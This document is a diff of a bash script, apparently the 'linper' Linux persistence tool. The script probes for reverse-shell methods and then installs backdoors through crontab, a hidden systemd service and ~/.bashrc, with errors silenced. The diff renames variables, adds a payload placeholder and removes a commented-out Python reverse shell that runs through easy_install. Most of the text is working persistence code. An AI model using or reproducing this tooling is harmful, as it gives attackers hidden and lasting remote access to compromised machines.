@@ -14,7 +14,7 @@ JJSFILE=$(mktemp)
 
 touch /dev/shm/.linpay
 
-methods=(
+METHODS=(
 	# array entry format = method, eval statement, payload: <- the ":" is important, and the spaces around the commas
 	# method = command that starts the reverse shell
 	# eval statement = if return true, then we can do what we want with the command
@@ -36,85 +36,54 @@ methods=(
 
 )
 
-
-
-doors=(
-	# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
-	# door = command
-	# eval statement = same as above
-	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
-	"crontab , crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron , echo \"$CRON $(cat /dev/shm/.linpay)\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:"
-	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
-	"bashrc , cd;find -writable -name .bashrc | grep -qi bashrc , echo \"$(cat /dev/shm/.linpay) 2> /dev/null & sleep .0001\" >> ~/.bashrc"
-)
-
-#TF=$(mktemp -d)
-#echo 'import sys,socket,os,pty;s=socket.socket()
-#s.connect((os.getenv("RPORT"),int(os.getenv("RHOST"))))
-#[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
-#pty.spawn("/bin/sh")' > $TF/setup.py
-#easy_install $TF
-#
-#TF=$(mktemp -d)
-#echo 'import sys,socket,os,pty;exit()' > $TF/setup.py
-#easy_install $TF
-
 # pass paylod to doors
 enum_methods() {
 	IFS=":"
-	for s in ${methods[@]};
+	for s in ${METHODS[@]};
 	do
-		method=$(echo $s | awk -F ' , ' '{print $1}')
-		eval_statement=$(echo $s | awk -F ' , ' '{print $2}')
-		payload=$(echo $s | awk -F ' , ' '{print $3}')
-		if $(echo $method | grep -qi "[a-z]")
+		METHOD=$(echo $s | awk -F ' , ' '{print $1}')
+		EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
+		PAYLOAD=$(echo $s | awk -F ' , ' '{print $3}')
+		if $(echo $METHOD | grep -qi "[a-z]")
 		then
-			#echo "method = " $method
-			#echo "eval staement = " $eval_statement
-			#echo "payload = " $payload
-			#echo
-			#echo "$eval_statement"
-			echo "$eval_statement" | $SHELL 2> /dev/null
+			echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null
 			if [ $? -eq 0 ];
 			then
-				echo -e "\e[92m[+]\e[0m Method Found: $method"
-				enum_doors $payload
+				echo -e "\e[92m[+]\e[0m Method Found: $METHOD"
+				enum_doors $PAYLOAD
 			fi
 		fi
 	done
 }
 
+DOORS=(
+	# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
+	# door = command
+	# eval statement = same as above
+	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
+	"crontab , crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron , echo \"$CRON $PUTPAYLOADHERE\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:"
+	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c 'PUTPAYLOADHERE' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
+	"bashrc , cd;find -writable -name .bashrc | grep -qi bashrc , echo \"PUTPAYLOADHERE 2> /dev/null & sleep .0001\" >> ~/.bashrc"
+)
+
 # enumerate where all backdoors can be placed
 enum_doors() {
 	IFS=":"
-	for s in ${doors[@]};
+	for s in ${DOORS[@]};
 	do
-		if $(echo $payload | grep -qi "[a-z]")
+		if $(echo $PAYLOAD | grep -qi "[a-z]")
 		then
-			door=$(echo $s | awk -F ' , ' '{print $1}')
-			#echo "door = " $door
-			eval_statement=$(echo $s | awk -F ' , ' '{print $2}')
-			#echo "eval = " $eval_statement
-			hinge=$(echo $s | awk -F ' , ' '{print $3}')
-			#echo "hinge = " $hinge
-			#echo "----------------------------"
-			if $(echo $door | grep -qi "[a-z]")
+			DOOR=$(echo $s | awk -F ' , ' '{print $1}')
+			EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
+			HINGE=$(echo $s | awk -F ' , ' '{print $3}')
+			if $(echo $DOOR | grep -qi "[a-z]")
 			then
-				#echo "method = " $method
-				#echo "eval staement = " $eval_statement
-				#echo "payload = " $payload
-				#echo
-				#echo "$eval_statement"
-				echo "$eval_statement" | $SHELL 2> /dev/null
+				echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null
 				if [ $? -eq 0 ];
 				then
-					if echo $door | grep -qi "[a-z]";
+					if echo $DOOR | grep -qi "[a-z]";
 					then
-						#hinge=$(cat /dev/shm/.linpay)
-						echo "[+] Door Found: $door"
-						#echo "eval = $eval_statement"
-						#echo "hinge = $hinge"
-						#echo "1 = $1"
+						echo "[+] Door Found: $DOOR"
 					fi
 				fi
 			fi
